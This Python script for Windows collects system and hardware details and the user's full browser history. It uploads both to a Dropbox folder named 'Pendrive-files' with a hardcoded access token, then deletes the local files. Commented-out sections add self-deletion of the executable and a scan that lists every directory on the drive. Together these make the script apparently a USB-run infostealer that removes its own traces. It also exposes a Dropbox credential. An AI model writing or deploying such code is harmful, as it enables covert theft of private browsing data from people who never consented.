
#import pathlib
#import cpuinfo

import time
import sys
import os
import time
import datetime
import GPUtil
import psutil
import wmi
import platform
import winreg
from browser_history import get_history
import dropbox
from dropbox.exceptions import AuthError

print("*"*20)

"""
specs_file = "example.txt"
file_path = os.path.join(os.getcwd(), specs_file)
print(file_path)
"""

### System information ###

uname = platform.uname()

list_sys = []

list_sys.append(["System", uname.system])
list_sys.append(["Node Name", uname.node])
list_sys.append(["Release", uname.release])
list_sys.append(["Version", uname.version])
list_sys.append(["Machine", uname.machine])
list_sys.append(["Processor", uname.processor])
list_sys.append(["Date time", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")])


print(list_sys)

### GPU information ###

list_gpus = []
gpus = GPUtil.getGPUs()


for gpu in gpus:
    list_gpus.append(["id", gpu.id])
    list_gpus.append(["GPU name", gpu.name])
    list_gpus.append(["load", f"{gpu.load*100} %"])
    list_gpus.append(["free memory", f"{gpu.memoryFree} MB"])
    list_gpus.append(["used memory", f"{gpu.memoryUsed} MB"])
    list_gpus.append(["total memory", f"{gpu.memoryTotal} MB"])
    list_gpus.append(["temperature", f"{gpu.temperature} C"])
    list_gpus.append(["uuid", gpu.uuid])

print(list_gpus)

### CPU information ###

reg_key = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"

try:
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key, 0, winreg.KEY_READ)
    cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
    winreg.CloseKey(key)
except FileNotFoundError:
    cpu_name = 'Unknown'

print("CPU Name:", cpu_name)

list_cpu = []
cpu_freq = psutil.cpu_freq()

list_cpu.append(["CPU name", cpu_name])
list_cpu.append(["Physical cores", psutil.cpu_count(logical = False)])
list_cpu.append(["Logical cores", psutil.cpu_count(logical = True)])
list_cpu.append(["Max Frequency", f"{cpu_freq.max:.2f} Mhz"])
list_cpu.append(["Min Frequency", f"{cpu_freq.min:.2f} Mhz"])
list_cpu.append(["Current Frequency", f"{cpu_freq.current:.2f} Mhz"])

print(list_cpu)

### RAM information ###

list_ram = []

total_ram = round(psutil.virtual_memory().total / (1024**3), 2)
total_ram_gb = f"{total_ram} GB"

wmi_obj = wmi.WMI()
ram_speed = wmi_obj.Win32_PhysicalMemory()[0].Speed
ram_speed_mhz = f"{ram_speed} Mhz"
ram_type = wmi_obj.Win32_PhysicalMemory()[0].MemoryType


list_ram.append(["Total RAM", total_ram_gb])
list_ram.append(["RAM Speed", ram_speed_mhz])
list_ram.append(["RAM type", ram_type])

print(list_ram)

### specification file ###
print("creating specs file")
with open("specs.txt","w") as file:
    file.writelines(("="*14, " System Details ", "="*13, "\n\n"))

    for header, spec in list_sys:
        file.writelines(f"{header : <16}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " GPU Details ", "="*15, "\n\n"))

    for header, spec in list_gpus:
        file.writelines(f"{header : <16}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " CPU Details ", "="*15, "\n\n"))

    for header, spec in list_cpu:
        file.writelines(f"{header : <18}{spec}\n")

    file.writelines("\n")
    file.writelines(("="*15, " RAM Details ", "="*15, "\n\n"))

    for header, spec in list_ram:
        file.writelines(f"{header : <18}{spec}\n")
print("done")

### Browsers history file ###

outputs = get_history()
outputs.save("history.csv")

print("done")

current_folder = os.getcwd()
print("Current folder path:", current_folder)

specs_file = "specs.txt"

specs_path = os.path.abspath(specs_file)

if os.path.isfile(specs_path):
    print(f"The file '{specs_file}' exists at path: {specs_path}")
else:
    print(f"The file '{specs_file}' does not exist in the current folder.")

def delete_file(file_path):
    try:
        os.remove(file_path)
        print("file", file_path, "deleted successfully")
    except:
        print("can't delete file")

def upload_file(file_path, access_token, destination_path):
    try:
        # Create a Dropbox object with the access token
        dbx = dropbox.Dropbox(access_token)

        # Open the file in read mode
        with open(file_path, "rb") as file:
            # Upload the file to Dropbox
            dbx.files_upload(file.read(), destination_path)

        print("File uploaded successfully!")
        delete_file(file_path)
    except AuthError as e:
        print("Error authenticating Dropbox account: ", e)
    except dropbox.exceptions.ApiError as e:
        print("Error uploading file to Dropbox: ", e)

def generate_paths():
    unix_time = time.time()
    paths = []
    
    destination_path = "/Dropbox/Aplikacje/Pendrive-files/"

    specs_file = "specs.txt"
    specs_destination_path = destination_path + str(unix_time) + "_specs.txt"
    specs_path = os.path.abspath(specs_file)

    history_file = "history.csv"
    history_destination_path = destination_path + str(unix_time) + "_history.csv"
    history_path = os.path.abspath(history_file)

    paths.append([specs_path, specs_destination_path])
    paths.append([history_path, history_destination_path])

    return paths



# Provide the path of the file you want to upload
file_path = specs_path
print(file_path)

# Provide your Dropbox access token
access_token = "sl.BfvDTf3T61F39KgCcIuyZZGq3VtpDU6X51EEaYrn1XVXrLJqIHEDcRdcyL3Cv3MlzX7BG_bDAFeloAvBqUXfJg_ncNS9HVQiKGh-SBy-zipGDHvfyz3WDQmx54aN_octHxczpHM"

# Specify the destination path in Dropbox where you want to upload the file
destination_path = "/Dropbox/Aplikacje/Pendrive-files/specs.txt"

# upload_file(file_path, access_token, destination_path)

### Directories file ###

print(generate_paths())
paths = generate_paths()

for i, path in enumerate(paths):
    print("Uploading file:", i, path[0], path[1])
    upload_file(path[0], access_token, path[1])
    #delete_file(path[0])
    print("done")

"""
# self destruct
def self_destruct():
    os.remove(sys.argv[0][:-2]+"exe")

self_destruct()

# Get the path of the currently running executable file
current_file_path = sys.executable

# Delete the executable file
print(1)
os.remove(current_file_path)
print(2)

time.sleep(1000)
a = input()
"""

# directories file 
"""
with open('directories.txt', 'w') as file:
    for root, dirs, files in os.walk('/'):
        for dir in dirs:
            file.write(os.path.join(root, dir) + '\n')

print("done")
"""
